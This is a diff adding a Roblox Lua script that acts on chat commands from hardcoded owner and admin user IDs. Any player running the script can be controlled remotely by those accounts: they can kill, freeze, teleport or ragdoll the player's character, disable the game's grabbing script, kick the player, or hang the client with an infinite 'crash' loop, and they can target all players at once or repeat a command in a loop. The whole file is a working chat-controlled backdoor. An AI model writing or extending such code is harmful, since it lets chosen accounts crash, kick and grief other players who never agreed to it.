@@ -1,0 +1,264 @@
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+if _G.AdminScriptRunning then return end
+_G.AdminScriptRunning = true
+
+local OwnerList = { 9034147951, 9078065998 }
+local AdminList = { 9083071762, 2323908038, 1997625112 }
+local Loops = {}
+local cmds = {}
+
+local function isOwner(userId)
+    for _, id in ipairs(OwnerList) do
+        if userId == id then return true end
+    end
+    return false
+end
+
+local function isAdmin(userId)
+    for _, id in ipairs(AdminList) do
+        if userId == id then return true end
+    end
+    return false
+end
+
+local function tf(v)
+    if not v then return nil end
+    v = tostring(v):lower()
+    if v == "true" then return true end
+    if v == "false" then return false end
+    return nil
+end
+
+cmds["tt"] = function(_, senderPlayer)
+    if not senderPlayer then return end
+    local myChar = LocalPlayer.Character
+    local myHrp = myChar:FindFirstChild("HumanoidRootPart")
+    local targetChar = senderPlayer.Character
+    local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
+    if myHrp and targetHrp then myHrp.CFrame = targetHrp.CFrame end
+end
+
+cmds["walkspeed"] = function(data)
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum.WalkSpeed = tonumber(data) or 16 end
+end
+
+cmds["jumppower"] = function(data)
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then
+        hum.UseJumpPower = true
+        hum.JumpPower = tonumber(data) or 24
+    end
+end
+
+cmds["sit"] = function(data)
+    local val = tf(data)
+    if val == nil then return end
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Sit = val end
+end
+
+cmds["jump"] = function()
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
+end
+
+cmds["stun"] = function(data)
+    local val = tf(data)
+    if val == nil then return end
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum.PlatformStand = val end
+end
+
+cmds["ice"] = function(data)
+    local val = tf(data)
+    if val == nil then return end
+    local char = LocalPlayer.Character
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if hrp then hrp.Anchored = val end
+end
+
+cmds["ragdoll"] = function(data)
+    local char = LocalPlayer.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local remote = ReplicatedStorage.CharacterEvents.RagdollRemote
+    if hrp then if remote then remote:FireServer(hrp, tonumber(data) or 0) end
+    end
+end
+
+cmds["bring"] = function(_, senderPlayer)
+    if not senderPlayer then return end
+    local myChar = LocalPlayer.Character
+    local myHrp = myChar:FindFirstChild("HumanoidRootPart")
+    local targetChar = senderPlayer.Character
+    local targetHrp = targetChar:FindFirstChild("HumanoidRootPart")
+    if myHrp and targetHrp then myHrp.CFrame = targetHrp.CFrame end
+end
+
+cmds["kill"] = function()
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+    if hum then hum.RigType = Enum.HumanoidRigType.R15 end
+end
+
+cmds["state"] = function(data)
+    local val = tf(data)
+    if val == nil then return end
+    local char = LocalPlayer.Character
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then hum.EvaluateStateMachine = val end
+end
+
+cmds["crash"] = function()
+    while true do end
+end
+
+cmds["fkick"] = function()
+    LocalPlayer:Kick("You have been kicked by an administrator.")
+end
+
+cmds["kick"] = function()
+    local char = LocalPlayer.Character
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    if hrp then hrp.CFrame = CFrame.new(9999999999, 9999999999, 9999999999) end
+    task.wait(0.2)
+    if char then char:Destroy() end
+end
+
+cmds["grab"] = function(data, senderPlayer)
+    if isOwner(LocalPlayer.UserId) then return end
+    if not senderPlayer then return end
+    local val = tf(data)
+    if val == nil then return end
+
+    local myChar = LocalPlayer.Character
+    if not myChar then return end
+
+    local grabbingScript = myChar:FindFirstChild("GrabbingScript")
+    if grabbingScript then grabbingScript.Enabled = val end
+
+    if val == false then
+        local camPart = myChar:FindFirstChild("CamPart")
+        if camPart then camPart:Destroy() end
+
+        local grabParts = workspace:FindFirstChild("GrabParts")
+        if grabParts then grabParts:Destroy() end
+    end
+end
+
+local function StartLoop(commandName, senderPlayer, data)
+    if Loops[commandName] then return end
+    Loops[commandName] = true
+    task.spawn(function()
+        while Loops[commandName] do
+            local char = LocalPlayer.Character
+            if char then pcall(function() cmds[commandName](data, senderPlayer) end) end
+            task.wait(0.1)
+        end
+        Loops[commandName] = nil
+    end)
+end
+
+local function StopLoop(commandName)
+    Loops[commandName] = nil
+end
+
+TextChatService.MessageReceived:Connect(function(textChatMessage)
+    pcall(function()
+        local sender = textChatMessage.TextSource
+        if not sender then return end
+
+        local senderPlayer = Players:GetPlayerByUserId(sender.UserId)
+        if not senderPlayer then return end
+
+        local message = textChatMessage.Text
+        if string.sub(message, 1, 1) ~= "/" then return end
+
+        local senderIsOwner = isOwner(sender.UserId)
+        local senderIsAdmin = isAdmin(sender.UserId)
+        if not (senderIsOwner or senderIsAdmin) then return end
+
+        local args = string.split(string.sub(message, 2), " ")
+        if #args == 0 then return end
+
+        local rawCmd = table.remove(args, 1):lower()
+
+        local data = nil
+        local isTarget = false
+
+        for i, arg in ipairs(args) do
+            local argLower = arg:lower()
+
+            if argLower == "@all" then
+                isTarget = true
+            elseif argLower == "@s" then
+                if senderPlayer == LocalPlayer then 
+                    isTarget = true 
+                end
+            elseif string.sub(LocalPlayer.Name:lower(), 1, #argLower) == argLower or
+                   string.sub(LocalPlayer.DisplayName:lower(), 1, #argLower) == argLower then
+                isTarget = true
+            else
+                if data == nil then
+                    local numVal = tonumber(arg)
+                    local boolVal = tf(arg)
+                    if numVal then
+                        data = numVal
+                    elseif boolVal ~= nil then
+                        data = tostring(boolVal)
+                    end
+                end
+            end
+        end
+
+        if not isTarget and #args == 0 then
+            if senderPlayer == LocalPlayer then
+                isTarget = true
+            end
+        end
+
+        if not isTarget then return end
+
+        if data == nil and #args > 0 then
+            for i, arg in ipairs(args) do
+                local numVal = tonumber(arg)
+                local boolVal = tf(arg)
+                if numVal then
+                    data = numVal
+                    break
+                elseif boolVal ~= nil then
+                    data = tostring(boolVal)
+                    break
+                end
+            end
+        end
+
+        if rawCmd:sub(1, 4) == "loop" then
+            local cmd = rawCmd:sub(5)
+            if cmds[cmd] then StartLoop(cmd, senderPlayer, data) end
+        elseif rawCmd:sub(1, 6) == "unloop" then
+            local cmd = rawCmd:sub(7)
+            StopLoop(cmd)
+        elseif cmds[rawCmd] then
+            cmds[rawCmd](data, senderPlayer)
+        end
+    end)
+end)
+
+LocalPlayer.CharacterAdded:Connect(function()
+    for commandName, active in pairs(Loops) do
+        if active then
+            task.wait(1)
+        end
+    end
+end)
